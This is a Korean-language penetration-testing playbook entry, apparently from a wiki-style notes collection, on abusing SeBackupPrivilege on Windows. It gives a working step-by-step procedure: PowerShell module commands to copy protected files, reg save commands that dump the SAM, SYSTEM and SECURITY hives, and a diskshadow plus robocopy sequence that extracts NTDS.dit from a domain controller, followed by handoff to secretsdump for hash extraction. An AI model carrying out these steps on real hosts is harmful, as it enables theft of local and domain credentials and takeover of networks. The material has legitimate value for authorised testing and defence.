---
tags:
  - 환경/windows
시작조건: ["대상 Windows 호스트에서 명령 실행", "현재 token에 SeBackupPrivilege가 할당됨"]
필요권한: ["SeBackupPrivilege", "DC의 NTDS.dit 수집 시 Backup Operators 구성원 또는 동등한 backup 권한"]
필요조건: ["대상에서 PowerShell 모듈 또는 robocopy를 실행할 수 있음", "복사본을 저장할 쓰기 경로"]
결과: ["ACL로 보호된 파일 사본", "SAM·SYSTEM 또는 NTDS.dit 오프라인 분석 입력"]
---

# SeBackupPrivilege로 보호된 파일과 hive 복사

## 한 줄 판단

현재 token에 `SeBackupPrivilege`가 있고 대상 Windows 호스트에서 backup semantics로 파일을 복사할 수 있으면, 일반 읽기가 거부된 파일과 registry hive의 사본을 확보하여 필요한 자격 증명·정보 추출 경로로 넘긴다.

## 사용할 때

- `whoami /priv`에 `SeBackupPrivilege`가 표시되고, 서비스 계정 또는 `Backup Operators` 멤버십처럼 해당 권한의 출처를 확인했을 때.
- 명령은 공격 호스트가 아니라 파일·hive가 있는 대상 Windows 호스트에서 실행한다.
- 일반 `type`, `Get-Content`, `copy`가 접근 거부되지만 파일의 경로와 필요한 산출물이 확인됐을 때.
- 도메인 컨트롤러에서는 `NTDS.dit`이 잠겨 있으므로 VSS 섀도 복사본에서 수집해야 한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 현재 token 권한 | `SeBackupPrivilege`가 존재하고 사용 가능한 상태 | `whoami /priv` | 권한이 없으면 일반 파일 ACL 또는 다른 권한 상승 경로 확인 |
| 실행 위치 | 파일이 있는 대상 Windows 호스트의 PowerShell 또는 CMD | `hostname`, `whoami` | 공격 호스트가 아닌 대상 세션에서 실행 |
| 대상 파일 | 읽기 거부된 파일·같은 시점의 hive 또는 섀도 복사본 `NTDS.dit` | `dir`, `Get-ChildItem` | 파일 경로·출처와 민감도를 먼저 확인 |
| 저장 경로 | 현재 계정이 사본을 만들 수 있는 경로 | 테스트 파일 생성과 ACL 확인 | 별도 쓰기 경로와 회수 경로 준비 |

## 실행

### PowerShell 모듈로 보호된 파일 복사

대상 Windows 호스트에서 `SeBackupPrivilegeUtils` 모듈을 불러온 뒤 privilege를 활성화하고, 일반 읽기가 거부된 파일을 별도 경로로 복사한다.

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Get-SeBackupPrivilege
Copy-FileSeBackupPrivilege '<PROTECTED_FILE>' '<WRITABLE_PATH>\<COPIED_FILE>'
```

확인할 출력:

- `Get-SeBackupPrivilege`의 `enabled`와 `Copy-FileSeBackupPrivilege`의 `Copied <SIZE> bytes`.
- 사본의 hash·크기와 내용을 확인한다. 복사 성공은 파일 내용의 유용성이나 관리자 권한을 뜻하지 않는다.
- `Access denied`는 privilege 활성 상태, 명시적 deny ACE, 원본 경로와 대상 저장 경로 ACL을 차례로 확인한다.

### registry hive 저장과 오프라인 분석 연결

```cmd
reg save HKLM\SAM <WRITABLE_PATH>\sam.save
reg save HKLM\SYSTEM <WRITABLE_PATH>\system.save
reg save HKLM\SECURITY <WRITABLE_PATH>\security.save
```

`The operation completed successfully`와 세 파일 생성을 확인한 뒤 [[Windows SAM SECURITY SYSTEM 덤프]]에서 산출물별로 분석한다.

### DC의 섀도 복사본에서 NTDS.dit 복사

DC에서만 `diskshadow`로 `C:`의 섀도 복사본을 노출한 후 `robocopy /B`로 `NTDS.dit` 사본을 만든다.

```text
diskshadow
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% <SHADOW_DRIVE>:
end backup
exit
```

```cmd
robocopy /B <SHADOW_DRIVE>:\Windows\NTDS <WRITABLE_PATH>\ntds ntds.dit
```

`robocopy` 결과에서 `Copied`가 1이고 `FAILED`가 0인지 확인한다. 사본과 같은 시점의 `SYSTEM` hive가 있어야 NTDS 분석 입력이 완성되며, 사본만으로 Domain Admin 세션이나 DCSync 권한을 얻은 것은 아니다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 보호 파일 사본을 읽을 수 있음 | ACL 우회 복사 성공 | 민감 정보·자격 증명 후보 | [[Windows 파일 자격증명 검색]] 또는 [[확보한 자격 증명으로 원격 접근 경로 선택]] |
| SAM·SECURITY·SYSTEM 세트 확보 | 로컬 자격 증명 분석 입력 확보 | 오프라인 hive 세트 | [[Windows SAM SECURITY SYSTEM 덤프]] |
| NTDS.dit와 SYSTEM hive 확보 | 도메인 자격 증명 오프라인 분석 입력 확보 | NTDS 분석 입력 | [[impacket-secretsdump]]로 계정별 hash를 추출한 뒤 실제 인증을 검증 |
| privilege가 있으나 복사 실패 | 명시적 deny 또는 도구·경로 조건 미충족 | 원본 미획득 | privilege 활성 상태와 ACE, 섀도 경로를 분리해 확인 |

## 변경 영향과 복구

| 변경 대상 | 예상 영향 | 검증 방법 | 복구 절차 |
|---|---|---|---|
| 대상에 만든 파일·hive·NTDS 사본 | 민감 데이터가 대상 디스크와 회수 경로에 남음 | 생성 경로·hash·전송 완료 확인 | 이번 작업으로 만든 사본만 삭제하고 부재 확인 |
| persistent VSS 섀도 복사본과 노출 드라이브 | 디스크 공간·노출 경로가 남을 수 있음 | `vssadmin list shadows`와 노출 드라이브 확인 | 복구 절차로 이번에 생성한 shadow와 노출 경로 제거 |

## 관련 도구

- [[SeBackupPrivilegeUtils]]
- [[impacket-secretsdump]]


## 참고 링크
- [Microsoft: SeBackupPrivilege](https://learn.microsoft.com/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories), [Microsoft: reg save](https://learn.microsoft.com/windows-server/administration/windows-commands/reg-save), [Microsoft: diskshadow](https://learn.microsoft.com/windows-server/administration/windows-commands/diskshadow), [Microsoft: robocopy](https://learn.microsoft.com/windows-server/administration/windows-commands/robocopy)
## 관련 상태 라우터

- [[Windows 셸 또는 세션 확보 후 컨텍스트 열거]]
- [[고권한 세션 확보 후 후속 판단]]
